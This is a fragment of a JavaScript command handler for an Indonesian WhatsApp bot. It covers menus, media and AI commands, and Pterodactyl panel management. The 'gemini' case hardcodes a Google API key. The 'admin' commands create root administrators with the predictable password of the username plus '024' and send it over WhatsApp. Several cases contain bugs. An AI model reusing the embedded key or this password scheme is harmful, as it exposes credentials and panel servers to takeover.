            case 'ownermenu': {
                const owned = `${owner}@s.whatsapp.net`
                const text12 = `*Haii* @${m.sender.split("@")[0]}, Selamat ${ucapan()}\nAda Yang Bisa Saya Bantu Kak?

❏━━『 *INFO USER* 』━━
┣✦  ɴᴀᴍᴀ: ${pushname} 
┣✦  ɴᴜᴍʙᴇʀ: ${m.sender.split('@')[0]}
┗━═┅═━━━═┅═━━━═┅═━━━๑

❏━━『 *INFO BOT* 』━━
┣✦ NAMA BOT: ${namabot}
┣✦ NOMOR CREATOR @${owner.split("@")[0]}
┣✦ VERSI SCRIPT ${global.versisc}
┣✦ VERSI BAILEYS: ^${version}
┣✦ RUNTIME: ${runtime(process.uptime())}
┗━═┅═━━━═┅═━━━═┅═━━━๑

❏━━『 *INFO HARI* 』━━
┣✦ TODAY: ${hariini}
┣✦ WAKTU WIB : ${wib}
┣✦ WAKTU WIT: ${wit}
┣✦ WAKTU WITA : ${wita}
┗━═┅═━━━═┅═━━━═┅═━━━๑

❏━━『 *OWNER MENU* 』━━
┣✦ ${prefix}public
┣✦ ${prefix}self
┣✦ ${prefix}addprem
┣✦ ${prefix}delprem
┣✦ ${prefix}addprem2
┣✦ ${prefix}delprem2
┣✦ ${prefix}listsrv
┣✦ ${prefix}delsrv
┣✦ ${prefix}listusr
┣✦ ${prefix}delusr
┣✦ ${prefix}listsrv2
┣✦ ${prefix}delsrv2
┣✦ ${prefix}listusr2
┣✦ ${prefix}delusr2
┣✦ ${prefix}hapuspanel idsrv
┣✦ ${prefix}listadmin
┣✦ ${prefix}hapuspanel2 idsrv
┣✦ ${prefix}listadmin2
┣✦ ${prefix}admin
┣✦ ${prefix}admin2
┗━═┅═━━━═┅═━━━═┅═━━━๑

© FlowFalcon 🍃
`
                reply(text12)
            }
                break
            case 'mainmenu': {
                const owned = `${owner}@s.whatsapp.net`
                const text12 = `*Haii* @${m.sender.split("@")[0]}, Selamat ${ucapan()}\nAda Yang Bisa Saya Bantu Kak?

❏━━『 *INFO USER* 』━━
┣✦  ɴᴀᴍᴀ: ${pushname} 
┣✦  ɴᴜᴍʙᴇʀ: ${m.sender.split('@')[0]}
┗━═┅═━━━═┅═━━━═┅═━━━๑

❏━━『 *INFO BOT* 』━━
┣✦ NAMA BOT: ${namabot}
┣✦ NOMOR CREATOR @${owner.split("@")[0]}
┣✦ VERSI SCRIPT ${global.versisc}
┣✦ VERSI BAILEYS: ^${version}
┣✦ RUNTIME: ${runtime(process.uptime())}
┗━═┅═━━━═┅═━━━═┅═━━━๑

❏━━『 *INFO HARI* 』━━
┣✦ TODAY: ${hariini}
┣✦ WAKTU WIB : ${wib}
┣✦ WAKTU WIT: ${wit}
┣✦ WAKTU WITA : ${wita}
┗━═┅═━━━═┅═━━━═┅═━━━๑

❏━━『 *MAIN MENU* 』━━
┣✦ ${prefix}tiktok
┣✦ ${prefix}remini
┣✦ ${prefix}play ( YouTube Player )
┣✦ ${prefix}splay ( Spotify Player )
┣✦ ${prefix}gpt4
┣✦ ${prefix}txt2img
┣✦ ${prefix}gemini
┣✦ ${prefix}pinterest
┗━═┅═━━━═┅═━━━═┅═━━━๑

© FlowFalcon 🍃
`
                reply(text12)
            }
                break
            case 'autobio': {
                if (!isOwner) return KleeReply(`Khusus Odading`)
                if (!args[0]) return m.reply(`Contoh: Jembut Kamu Hytam`)
                if (args[0] === 'on') {
                    global.autobio = true
                    await m.reply('Sukses mengaktifkan autobio.')
                } else if (args[0] === 'off') {
                    global.autobio = true
                    await m.reply('Sukses menonaktifkan autobio.')
                }
            }
                break
            case 'pinterest':
            case 'pin': {
                if (!text) return m.reply("Mana text nya?")
                const { GOOGLE_IMG_SCRAP } = require('google-img-scrap');
                let cariimg = await GOOGLE_IMG_SCRAP({ search: text, limit: 6, domains: ["pinterest.com"] })
                let imgs = cariimg.result
                let imgres = cariimg.result.length
                if (imgres == 0) return m.reply("Hasil tidak di temukan")
                let lim = () => {
                    if (imgres > 7) { return 7 } else { return imgres }
                }
                let lmt = lim()
                let arrcard = []
                for (let i = 0; i < lmt; i++) {
                    let eek = {
                        "header": proto.Message.InteractiveMessage.Header.create({
                            ...(await prepareWAMessageMedia({ image: await getBuffer(imgs[i].url) }, { upload: Klee.waUploadToServer })),
                            title: `*[PINTEREST SEARCH]*`,
                            gifPlayback: true,
                            subtitle: '',
                            hasMediaAttachment: false
                        }),
                        "body": {
                            "text": `Hasil ${i + 1} pinterest`
                        },
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [
                                {
                                    "name": "cta_url",
                                    "buttonParamsJson": `{"display_text":"Link","url":"${imgs[i].url}","merchant_url":"https://www.google.co.id"}`
                                }
                            ]
                        })
                    }
                    arrcard.push(eek)
                    await sleep(2000)
                }

                let ctamsg = generateWAMessageFromContent(m.chat, {
                    viewOnceMessage: {
                        message: {
                            "messageContextInfo": {
                                "deviceListMetadata": {},
                                "deviceListMetadataVersion": 2
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.create({
                                body: { text: "*Berikut Hasil Pencarian Anda*" },
                                carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.create({
                                    "cards": arrcard,
                                    "messageVersion": 1
                                }
                                )
                            })
                        }
                    }
                }, {});
                await Klee.relayMessage(ctamsg.key.remoteJid, ctamsg.message, {
                    messageId: ctamsg.key.id
                })

            }
                break
            case 'kiced': {
                if (!m.isGroup) return m.reply(msg.group)
                if (!isBotAdmins) return m.reply(msg.admin)
                if (!isAdmin) return m.reply(msg.owner)
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await Klee.groupParticipantsUpdate(from, [users], 'remove')
                m.reply(msg.done)
            }
                break

            case 'gemini': {
                const prompt = text.trim();
                if (!prompt) {
                    return m.reply("Masukkan prompt untuk digunakan! Contoh: .gemini Explain how AI works");
                }
                // Fungsi untuk mengirim permintaan ke API Gemini
                const sendToGemini = async (prompt) => {
                    const apiKey = 'AIzaSyB2mvsGVTZAU-h-GtCLzoLhjHEdvugx9uQ';
                    const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash-latest:generateContent?key=${apiKey}`;

                    const body = {
                        contents: [
                            {
                                parts: [
                                    { text: prompt }
                                ]
                            }
                        ]
                    };

                    try {
                        const response = await fetch(url, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify(body)
                        });

                        const data = await response.json();

                        if (response.ok) {
                            return data; // Mengembalikan data respons dari API
                        } else {
                            throw new Error(data.error.message || 'Request failed');
                        }
                    } catch (error) {
                        console.error('Error:', error.message);
                        return null;
                    }
                };

                try {
                    const response = await sendToGemini(prompt);
                    if (response) {
                        // Mengambil teks dari respons API
                        const candidates = response.candidates;
                        const message = candidates && candidates.length > 0
                            ? candidates[0].content.parts[0].text // Mengambil bagian teks
                            : 'Tidak ada respons yang diterima dari model.';

                        // Menampilkan respons yang didapat dari Gemini
                        m.reply(`Hasil Gemini:\n${message}`);
                    } else {
                        m.reply('Gagal mendapatkan respons dari Gemini API.');
                    }
                } catch (error) {
                    console.error(error);
                    m.reply('Terjadi kesalahan saat memproses permintaan Anda.');
                }
            }
                break

            case 'txt2img': {
                if (!text) return m.reply(`Example: ${prefix + command} cat`)
                async function photoleap(prompt) {
                    try {
                        let result = []
                        for (let i = 0; i < 3; i++) {
                            let {
                                data
                            } = await axios.get('https://tti.photoleapapp.com/api/v1/generate?prompt=' + prompt);
                            result.push(data.result_url)
                        }
                        return result
                    } catch (e) {
                        return ({
                            msg: 404
                        })
                    }
                }

                let tahu = await photoleap(text)
                for (const x of tahu) {
                    Klee.sendMessage(m.chat, { image: { url: x }, caption: `Done` }, { quoted: m })
                }
            }
                break
            case 'gpt4': {
                if (!text) return m.reply(`Hai, apa yang ingin saya bantu?`)
                async function openai(text, logic) { // Membuat fungsi openai untuk dipanggil
                    let response = await axios.post("https://chateverywhere.app/api/chat/", {
                        "model": {
                            "id": "gpt-4",
                            "name": "GPT-4",
                            "maxLength": 32000,  // Sesuaikan token limit jika diperlukan
                            "tokenLimit": 8000,  // Sesuaikan token limit untuk model GPT-4
                            "completionTokenLimit": 5000,  // Sesuaikan jika diperlukan
                            "deploymentName": "gpt-4"
                        },
                        "messages": [
                            {
                                "pluginId": null,
                                "content": text,
                                "role": "user"
                            }
                        ],
                        "prompt": logic,
                        "temperature": 0.5
                    }, {
                        headers: {
                            "Accept": "/*/",
                            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
                        }
                    });

                    let result = response.data;
                    return result;
                }

                let kanjuthann = await openai(text, "nama mu adalah Furina, kamu adalah asisten kecerdasan buatan yang sering membantu orang lain jika ada yang ditanyakan")
                m.reply(kanjuthann)
            }
                break
            case 'tiktok': case "tt": {
                if (!text) return reply(`Example : ${prefix + command} link`);
                if (!text.includes('tiktok')) return reply(`Link Invalid!!`);
                reply("PROSES TUAN MOHON JANGAN SPAM..");

                // Menggunakan fetch untuk akses API TikTok milikmu
                fetch(`https://api.tiklydown.eu.org/api/download/v5?url=${encodeURIComponent(text)}`)
                    .then(response => response.json())
                    .then(data => {
                        if (data.status !== 200) return reply('Gagal mengambil data dari API');

                        // Mengambil URL video dan audio
                        const title = `${data.result.title}\n${data.result.size}\n© KleeMD - FlowFalcon`
                        const videoUrl = data.result.play;
                        const audioUrl = data.result.music;

                        // Mengirim video dan audio
                        Klee.sendMessage(m.chat, { caption: title, video: { url: videoUrl } }, { quoted: m });
                        Klee.sendMessage(m.chat, { audio: { url: audioUrl }, mimetype: 'audio/mp4' }, { quoted: m });
                    })
                    .catch(err => reply(err.toString()));
            }
                break;
            case "play": {
                const axios = require("axios");
                if (!text) return m.reply('Masukkan Judul Contoh\nContoh La Vagualette!');

                await reply("Mohon Tunggu Sebentar...");

                try {
                    // URL API untuk pencarian lagu
                    const searchApiUrl = `https://api.agatz.xyz/api/ytsearch?message=${encodeURIComponent(text)}`;
                    const searchData = (await axios.get(searchApiUrl)).data;

                    // Pilih hasil pertama dari data pencarian
                    const data = searchData.data[0];
                    if (!data) return reply("Lagu tidak ditemukan.");

                    // Teks yang akan dikirimkan
                    const tekswait = `_###_ YOUTUBE PLAYER ###

- Judul: ${data.title}
- Artis: ${data.author.name}
- URL: ${data.url}`;

                    // Mengirim pesan informasi lagu
                    await Klee.sendMessage(m.chat, {
                        text: `${tekswait}`,
                        contextInfo: {
                            mentionedJid: [m.sender],
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${data.title}`,
                                body: "YOUTUBE SEARCH & DOWNLOAD",
                                thumbnailUrl: data.thumbnail,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, { quoted: qchanel });

                    // URL API untuk download lagu
                    const downloadApiUrl = `https://api.nexoracle.com/downloader/yt-audio?apikey=free_key@maher_apis&url=${encodeURIComponent(data.url)}`;
                    const downloadData = (await axios.get(downloadApiUrl)).data;

                    // Cek jika status berhasil
                    if (downloadData.status === 200 && downloadData.result.audio) {
                        const audioUrl = downloadData.result.audio;
                        const title = downloadData.result.title || "Audio";
                        const thumbnail = downloadData.result.thumb;

                        // Mengirim audio melalui WhatsApp
                        await Klee.sendMessage(m.chat, {
                            audio: { url: audioUrl },
                            mimetype: 'audio/mpeg',
                            fileName: `${title}.mp3`,
                            thumbnail: thumbnail
                        }, { quoted: m });
                    } else {
                        m.reply("Gagal mendapatkan file audio.");
                    }
                } catch (error) {
                    console.error(error);
                    m.reply("Terjadi kesalahan saat mengambil file audio.");
                }
            }
                break;
            case "splay": {
                const axios = require("axios");
                if (!text) return m.reply('Masukkan Judul Contoh\nContoh `La Vagualette!`');

                await reply("Mohon Tunggu Sebentar...");

                try {
                    // URL API untuk pencarian lagu
                    const searchApiUrl = `https://spotifyapi.caliphdev.com/api/search/tracks?q=${encodeURIComponent(text)}`;
                    const searchData = (await axios.get(searchApiUrl)).data;

                    // Pilih hasil pertama dari data pencarian
                    const data = searchData[0];
                    if (!data) return reply("Lagu tidak ditemukan.");

                    // Teks yang akan dikirimkan
                    const tekswait = `_###_ *SPOTIFY PLAYER* _###_

- *Judul:* ${data.title}
- *Artis:* ${data.artist}
- *URL:* ${data.url}`;

                    // Mengirim pesan informasi lagu
                    await Klee.sendMessage(m.chat, {
                        text: `${tekswait}`,
                        contextInfo: {
                            mentionedJid: [m.sender],
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${data.title}`,
                                body: "SPOTIFY SEARCH & DOWNLOAD",
                                thumbnailUrl: data.thumbnail,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, { quoted: qchanel });

                    // URL API untuk download lagu
                    const downloadApiUrl = `https://spotifyapi.caliphdev.com/api/download/track?url=${encodeURIComponent(data.url)}`;
                    // Mendapatkan data dari API
                    let response = await fetch(downloadApiUrl);

                    // Memastikan respon adalah tipe audio
                    if (response.headers.get("content-type") === "audio/mpeg") {
                        // Mengirim audio melalui WhatsApp
                        await Klee.sendMessage(m.chat, { audio: { url: downloadApiUrl }, mimetype: 'audio/mpeg' }, { quoted: m });
                    } else {
                        m.reply("Gagal mendapatkan file audio.");
                    }
                } catch (error) {
                    console.error(error);
                    m.reply("Terjadi kesalahan saat mengambil file audio.");
                }
            }
                break;
            case 'hdr': case 'remini': {
                if (!quoted) return reply(`Fotonya Mana Kak ?`)
                if (!/image/.test(mime)) return reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
                reply("Proses Kak....")
                let media = await quoted.download()
                const { remini } = require('./all/remini.js')
                let proses = await remini(media, "enhance");
                Klee.sendMessage(m.chat, { image: proses, caption: '🍁 Ini Hasilnya Kak...' }, { quoted: m })
                await sleep(5000)
            }
                break

            case "public": {
                if (!isOwner) return KleeReply(msg.owner)
                Klee.public = true
                reply("Berhasil mengganti mode bot menjadi *Public*")
            }
                break
            case "self": {
                if (!isOwner) return KleeReply(msg.owner)
                Klee.public = false
                reply("Berhasil mengganti mode bot menjadi *Self*")
            }
                break

            case "owner": {
                Klee.sendContact(m.chat, [owner], "Developer Bot WhatsApp", null, {
                    contextInfo: {
                        mentionedJid: [m.sender],
                        externalAdReply: {
                            showAdAttribution: true,
                            thumbnail: `https://telegra.ph/file/fdae7519babe60a216115.jpg`,
                            title: `© Copyright ${global.namabot}`,
                            renderLargerThumbnail: true,
                            sourceUrl: ``,
                            mediaType: 1
                        }
                    }
                })
            }
                break
            case "addprem": {
                if (!isOwner) return m.reply('Fitur Ini hanya dapat di akses Oleh Owner Seseorang!')
                if (!args[0]) return m.reply(`Penggunaan ${prefix + command} nomor\nContoh ${prefix + command} 62895428251533`)
                prrkek = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`
                let ceknya = await Klee.onWhatsApp(prrkek)
                if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
                prem.push(prrkek)
                fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
                m.reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
            }
                break
            case "delprem": {
                if (!isOwner) return m.reply('Fitur Ini hanya dapat di akses Oleh Owner Seseorang!')
                if (!args[0]) return m.reply(`Penggunaan ${prefix + command} nomor\nContoh ${prefix + command} 62895428251533`)
                ya = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`
                unp = prem.indexOf(ya)
                prem.splice(unp, 1)
                fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
                reply(`Nomor ${ya} Telah Di Hapus Premium!`)
            }
                break
            case "addprem2": {
                if (!isOwner) return m.reply('Fitur Ini hanya dapat di akses Oleh Owner Seseorang!')
                if (!args[0]) return m.reply(`Penggunaan ${prefix + command} nomor\nContoh ${prefix + command} 62895428251533`)
                prrkek = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`
                let ceknya = await Klee.onWhatsApp(prrkek)
                if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
                seler.push(prrkek)
                fs.writeFileSync("./all/database/reseller.json", JSON.stringify(prem))
                m.reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
            }
                break
            case "delprem": {
                if (!isOwner) return m.reply('Fitur Ini hanya dapat di akses Oleh Owner Seseorang!')
                if (!args[0]) return m.reply(`Penggunaan ${prefix + command} nomor\nContoh ${prefix + command} 62895428251533`)
                ya = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`
                unp = prem.indexOf(ya)
                seler.splice(unp, 1)
                fs.writeFileSync("./all/database/reseller.json", JSON.stringify(prem))
                reply(`Nomor ${ya} Telah Di Hapus Premium!`)
            }
                break
            case "listsrv": {
                if (!isOwner) return m.reply(`Maaf, Anda tidak dapat melihat daftar server.`);
                let page = args[0] ? args[0] : '1';
                let f = await fetch(domain + "/api/application/servers?page=" + page, {
                    "method": "GET",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey
                    }
                });
                let res = await f.json();
                let servers = res.data;
                let sections = [];
                let messageText = "Berikut adalah daftar server:\n\n";

                for (let server of servers) {
                    let s = server.attributes;

                    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
                        "method": "GET",
                        "headers": {
                            "Accept": "application/json",
                            "Content-Type": "application/json",
                            "Authorization": "Bearer " + capikey
                        }
                    });

                    let data = await f3.json();
                    let status = data.attributes ? data.attributes.current_state : s.status;

                    messageText += `ID Server: ${s.id}\n`;
                    messageText += `Nama Server: ${s.name}\n`;
                    messageText += `Status: ${status}\n\n`;
                }

                messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
                messageText += `Total Server: ${res.meta.pagination.count}`;

                await Klee.sendMessage(m.chat, { text: messageText }, { quoted: m });

                if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
                    m.reply(`Gunakan perintah ${prefix}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
                }
            }
                break;
            case "listusr": {
                if (!isOwner) return m.reply('Fitur Ini hanya dapat di akses Oleh Owner Seseorang!r')
                let page = args[0] ? args[0] : '1';
                let f = await fetch(domain + "/api/application/users?page=" + page, {
                    "method": "GET",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey
                    }
                });
                let res = await f.json();
                let users = res.data;
                let messageText = "Berikut list user:\n\n";

                for (let user of users) {
                    let u = user.attributes;
                    messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
                    messageText += `${u.username}\n`;
                    messageText += `${u.first_name} ${u.last_name}\n\n`;
                }

                messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
                messageText += `Total Users: ${res.meta.pagination.count}`;

                await Klee.sendMessage(m.chat, { text: messageText }, { quoted: m });

                if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
                    m.reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
                }
            }
                break;
            case "listsrv2": {
                if (!isOwner) return m.reply(`Maaf, Anda tidak dapat melihat daftar server.`);
                let page = args[0] ? args[0] : '1';
                let f = await fetch(domain2 + "/api/application/servers?page=" + page, {
                    "method": "GET",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey2
                    }
                });
                let res = await f.json();
                let servers = res.data;
                let sections = [];
                let messageText = "Berikut adalah daftar server:\n\n";

                for (let server of servers) {
                    let s = server.attributes;

                    let f3 = await fetch(domain2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
                        "method": "GET",
                        "headers": {
                            "Accept": "application/json",
                            "Content-Type": "application/json",
                            "Authorization": "Bearer " + capikey2
                        }
                    });

                    let data = await f3.json();
                    let status = data.attributes ? data.attributes.current_state : s.status;

                    messageText += `ID Server: ${s.id}\n`;
                    messageText += `Nama Server: ${s.name}\n`;
                    messageText += `Status: ${status}\n\n`;
                }

                messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
                messageText += `Total Server: ${res.meta.pagination.count}`;

                await Klee.sendMessage(m.chat, { text: messageText }, { quoted: m });

                if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
                    m.reply(`Gunakan perintah ${prefix}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
                }
            }
                break;
            case "listusr2": {
                if (!isOwner) return m.reply('Fitur Ini hanya dapat di akses Oleh Owner Seseorang!r')
                let page = args[0] ? args[0] : '1';
                let f = await fetch(domain2 + "/api/application/users?page=" + page, {
                    "method": "GET",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey2
                    }
                });
                let res = await f.json();
                let users = res.data;
                let messageText = "Berikut list user:\n\n";

                for (let user of users) {
                    let u = user.attributes;
                    messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
                    messageText += `${u.username}\n`;
                    messageText += `${u.first_name} ${u.last_name}\n\n`;
                }

                messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
                messageText += `Total Users: ${res.meta.pagination.count}`;

                await Klee.sendMessage(m.chat, { text: messageText }, { quoted: m });

                if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
                    m.reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
                }
            }
                break;
            case "delsrv": {
                if (!isOwner) return m.reply(`Fitur Ini hanya dapat di akses Oleh Owner Seseorang!`)

                let srv = args[0]
                if (!srv) return m.reply('ID nya mana?')
                let f = await fetch(domain + "/api/application/servers/" + srv, {
                    "method": "DELETE",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey,
                    }
                })
                let res = f.ok ? {
                    errors: null
                } : await f.json()
                if (res.errors) return m.reply('*SERVER NOT FOUND*')
                m.reply('*SUCCESSFULLY DELETE THE SERVER*')
            }
                break
            case "delusr": {
                if (!isOwner) return m.reply(`Fitur Ini hanya dapat di akses Oleh Owner Seseorang!`)
                let usr = args[0]
                if (!usr) return m.reply('ID nya mana?')
                let f = await fetch(domain + "/api/application/users/" + usr, {
                    "method": "DELETE",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey
                    }
                })
                let res = f.ok ? {
                    errors: null
                } : await f.json()
                if (res.errors) return m.reply('*USER NOT FOUND*')
                m.reply('*SUCCESSFULLY DELETE THE USER*')
            }
                break
            case "delsrv2": {
                if (!isOwner) return m.reply(`Fitur Ini hanya dapat di akses Oleh Owner Seseorang!`)

                let srv = args[0]
                if (!srv) return m.reply('ID nya mana?')
                let f = await fetch(domain2 + "/api/application/servers/" + srv, {
                    "method": "DELETE",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey2,
                    }
                })
                let res = f.ok ? {
                    errors: null
                } : await f.json()
                if (res.errors) return m.reply('*SERVER NOT FOUND*')
                m.reply('*SUCCESSFULLY DELETE THE SERVER*')
            }
                break
            case "delusr2": {
                if (!isOwner) return m.reply(`Fitur Ini hanya dapat di akses Oleh Owner Seseorang!`)
                let usr = args[0]
                if (!usr) return m.reply('ID nya mana?')
                let f = await fetch(domain2 + "/api/application/users/" + usr, {
                    "method": "DELETE",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey2
                    }
                })
                let res = f.ok ? {
                    errors: null
                } : await f.json()
                if (res.errors) return m.reply('*USER NOT FOUND*')
                m.reply('*SUCCESSFULLY DELETE THE USER*')
            }
                break

            case "admin": {
                if (!isOwner) return m.reply(`*Fitur Ini hanya dapat di akses Oleh Owner Seseorang!*`)
                if (!isOwner) return m.reply(mess.owner)

                let s = q.split(',')
                let email = s[0];
                let username = s[0]
                let nomor = s[1]
                if (s.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
                if (!username) return m.reply(`Ex : ${prefix + command} Username,@tag/nomor\n\nContoh :\n${prefix + command} example,@user`)
                if (!nomor) return m.reply(`Ex : ${prefix + command} Username,@tag/nomor\n\nContoh :\n${prefix + command} example,@user`)
                let password = username + "024"
                let nomornya = nomor.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                let f = await fetch(domain + "/api/application/users", {
                    "method": "POST",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey
                    },
                    "body": JSON.stringify({
                        "email": username + "@gmail.com",
                        "username": username,
                        "first_name": username,
                        "last_name": "Admin",
                        "language": "en",
                        "root_admin": true,
                        "password": password.toString()
                    })

                })

                let data = await f.json();

                if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

                let user = data.attributes

                let tks = `
TYPE: USER

ID: ${user.id}
USERNAME: ${user.username}
EMAIL: ${user.email}
NAME: ${user.first_name} ${user.last_name}
CREATED AT: ${user.created_at}
`
                const listMessage = {
                    text: tks,
                }
                await Klee.sendMessage(m.chat, listMessage)
                await Klee.sendMessage(nomornya, {
                    text: `_*BERIKUT DETAIL AKUN ADMIN  PANEL ANDA*_\n
Username :  ${username}
Password: ${password}
Login: ${domain}

Catatan Tambahan
> dilarang bagi-bagi panel secara gratis
> dilarang menyebarkan data anda
> dilarang menyebarkan Link login
> info selengkapnya hubungi owner panel
`,
                })
            }

                break
            case "admin2": {
                if (!isOwner) return m.reply(`*Fitur Ini hanya dapat di akses Oleh Owner Seseorang!*`)
                if (!isOwner) return m.reply(mess.owner)

                let s = q.split(',')
                let email = s[0];
                let username = s[0]
                let nomor = s[1]
                if (s.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
                if (!username) return m.reply(`Ex : ${prefix + command} Username,@tag/nomor\n\nContoh :\n${prefix + command} example,@user`)
                if (!nomor) return m.reply(`Ex : ${prefix + command} Username,@tag/nomor\n\nContoh :\n${prefix + command} example,@user`)
                let password = username + "024"
                let nomornya = nomor.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                let f = await fetch(domain2 + "/api/application/users", {
                    "method": "POST",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey2
                    },
                    "body": JSON.stringify({
                        "email": username + "@gmail.com",
                        "username": username,
                        "first_name": username,
                        "last_name": "Admin",
                        "language": "en",
                        "root_admin": true,
                        "password": password.toString()
                    })

                })

                let data = await f.json();

                if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

                let user = data.attributes

                let tks = `
TYPE: USER

ID: ${user.id}
USERNAME: ${user.username}
EMAIL: ${user.email}
NAME: ${user.first_name} ${user.last_name}
CREATED AT: ${user.created_at}
`
                const listMessage = {
                    text: tks,
                }
                await Klee.sendMessage(m.chat, listMessage)
                await Klee.sendMessage(nomornya, {
                    text: `_*BERIKUT DETAIL AKUN ADMIN  PANEL ANDA*_\n
Username :  ${username}
Password: ${password}
Login: ${domain2}

Catatan Tambahan
> dilarang bagi-bagi panel secara gratis
> dilarang menyebarkan data anda
> dilarang menyebarkan Link login
> info selengkapnya hubungi owner panel
`,
                })
            }

                break

            case "listadmin": {
                if (!isOwner) return m.reply(`Maaf, Anda tidak dapat melihat daftar pengguna.`);
                let page = args[0] ? args[0] : '1';
                let f = await fetch(domain + "/api/application/users?page=" + page, {
                    "method": "GET",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey
                    }
                });
                let res = await f.json();
                let users = res.data;
                let messageText = "Berikut list admin:\n\n";

                for (let user of users) {
                    let u = user.attributes;
                    if (u.root_admin) {
                        messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
                        messageText += `${u.username}\n`;
                        messageText += `${u.first_name} ${u.last_name}\n\n`;
                    }
                }

                messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
                messageText += `Total Admin: ${res.meta.pagination.count}`;

                await Klee.sendMessage(m.chat, { text: messageText }, { quoted: m });

                if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
                    m.reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
                }
            }
                break;
            case "listadmin2": {
                if (!isOwner) return m.reply(`Maaf, Anda tidak dapat melihat daftar pengguna.`);
                let page = args[0] ? args[0] : '1';
                let f = await fetch(domain2 + "/api/application/users?page=" + page, {
                    "method": "GET",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey2
                    }
                });
                let res = await f.json();
                let users = res.data;
                let messageText = "Berikut list admin:\n\n";

                for (let user of users) {
                    let u = user.attributes;
                    if (u.root_admin) {
                        messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
                        messageText += `${u.username}\n`;
                        messageText += `${u.first_name} ${u.last_name}\n\n`;
                    }
                }

                messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
                messageText += `Total Admin: ${res.meta.pagination.count}`;

                await Klee.sendMessage(m.chat, { text: messageText }, { quoted: m });

                if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
